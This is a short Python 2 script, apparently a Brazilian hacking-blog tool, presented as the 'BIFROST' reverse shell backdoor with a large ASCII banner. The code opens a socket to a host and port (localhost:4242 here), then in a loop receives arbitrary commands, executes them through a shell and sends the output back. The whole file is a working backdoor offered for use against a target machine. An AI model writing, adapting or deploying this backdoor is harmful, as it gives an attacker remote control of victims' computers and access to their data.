#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket, subprocess


def banner():
    print """                                                                          `       ``
                                                 .++++-  `+- :++++/ ++++:    `+oo/`   :oo+:-o++++++-
                                                -ooooo: `o+ .soooo-.soooo-   +o++oo`  +o+/o+:ooooooo:
                                               /o.`.so` +o``o+```` /o.`:o+  `so` .oo` /o- `--```.o/``
                                             `++`  +o. /o. /o`     oo   so  :o/   `o+`.s/        .o/
                                            -o/` `+o. :o- -o:     .s/   so  /o-    -o/ +o.        .o+`
                                           /o-  -++` :o: `o+      /o-  .s+  +o.     /o-`oo-        `++`
                                         `+oo//++:` -o/  +oo///-  oo` `+o:  +o.     `oo`.oo+/-.     `+o.
                                        -ooooooo`  .o+` :oooooo. .so+++o+   +o-      /o: `/+ooo+-    `+o-
                                       :o/...+oo  `oo` .oo.....  /oo+ooo.   /o:      .so   `-:+oo+.    /o:
                                     `+o-   `oo- `oo.  +o-       oo-``/o+   :o+       oo-      `:oo-    /o:
                                    .oo.    +o: `+o-  :o/       .so   `so.  .so`      +o/        .oo-    :o/`
                                   :o+`   `+o/  /o/  .oo`       /o/    +o+   oo/      /oo         .oo.    :o+`
                                 `/o/`  `-oo:  /o+  `oo-        oo-    .oo`  -oo:     ooo   -`     /oo     -o+.
                                .ooo:::/+o+.  :o+`  /o+        .so`     oo/   :oo/-../oo/   :o/:...+oo-     -oo.
                               -ooooooo+/.   -oo.  -oo`        /oo      :oo`   -+oooooo+`    +oooooooo-      .oo-
                               -------.`     --.   .-.         .-.      `--`     .://:.       `.:://:.        `--
                                            `` `    `       `  `  `` ``                  `
                                                        BIFROST - PYTHON REVERSE SHELL BACKDOOR
                                            Matheus Scarpato Fidelis aka D0ctor - http://www.nanoshots.com.br
                                                    Ciência Hacker - http://www.cienciahacker.com.br
    """
    #Executado na máquina alvo	
    host = 'localhost'
    port = 4242
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.connect((host, port))
    server.send('[*] Connection Established!')

    while 1:
        #Recebe o Shell
        data = server.recv(1024)
        if data == "quit":
            break

        #Executa o SHELL
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # Lê a Saída
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # Envia a Saída
        server.send(stdout_value)

    server.close()




def main():
    banner()

main()
